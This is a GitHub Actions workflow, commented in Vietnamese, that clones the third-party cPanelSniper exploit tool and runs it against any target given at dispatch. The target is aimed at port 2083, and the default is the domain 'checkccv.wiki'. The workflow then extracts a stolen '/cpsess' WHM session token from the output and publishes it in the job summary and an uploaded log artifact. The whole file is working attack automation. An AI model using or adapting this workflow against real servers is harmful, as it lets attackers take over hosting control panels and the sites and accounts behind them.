name: Test cPanelSniper (Auto-Clone)

on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Mục tiêu (IP hoặc domain)'
        required: true
        default: 'checkccv.wiki'
        type: string

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      # Bước 1: Clone repository CỦA BẠN (nơi chứa workflow này)
      - name: Checkout your repo
        uses: actions/checkout@v4

      # Bước 2: Clone công cụ cPanelSniper từ repo gốc
      - name: Clone cPanelSniper
        run: |
          git clone https://github.com/ynsmroztas/cPanelSniper.git
          # Sao chép file script vào thư mục gốc để dễ sử dụng
          cp cPanelSniper/cPanelSniper.py .

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      # Lưu ý: Script này không cần cài thêm thư viện (Pure Python stdlib)[reference:3]
      - name: Show help (kiểm tra script hoạt động)
        run: python cPanelSniper.py -h

      - name: Run exploit on port 2083
        run: |
          echo "🔍 Target: https://${{ github.event.inputs.target }}:2083"
          echo "https://${{ github.event.inputs.target }}:2083" | python cPanelSniper.py 2>&1 | tee output.log

      - name: Extract token and show summary
        run: |
          echo "### Kết quả kiểm tra lỗ hổng" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          TOKEN=$(grep -oP '/cpsess[0-9]+' output.log | head -1)
          if [ -n "$TOKEN" ]; then
            echo "✅ **THÀNH CÔNG!** Lỗ hổng tồn tại." >> $GITHUB_STEP_SUMMARY
            echo "🔑 **Token WHM:** \`$TOKEN\`" >> $GITHUB_STEP_SUMMARY
            echo "" >> $GITHUB_STEP_SUMMARY
            echo "📝 Dòng log chứa token:" >> $GITHUB_STEP_SUMMARY
            echo "\`\`\`" >> $GITHUB_STEP_SUMMARY
            grep -i "token.*:/cpsess" output.log | head -1 >> $GITHUB_STEP_SUMMARY
            echo "\`\`\`" >> $GITHUB_STEP_SUMMARY
          else
            echo "❌ **Không tìm thấy token.**" >> $GITHUB_STEP_SUMMARY
            echo "Máy chủ có thể đã được vá hoặc không bị ảnh hưởng." >> $GITHUB_STEP_SUMMARY
          fi
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "### 📜 Toàn bộ log" >> $GITHUB_STEP_SUMMARY
          echo "\`\`\`" >> $GITHUB_STEP_SUMMARY
          cat output.log >> $GITHUB_STEP_SUMMARY
          echo "\`\`\`" >> $GITHUB_STEP_SUMMARY

      - name: Upload log artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: exploit-log
          path: output.log
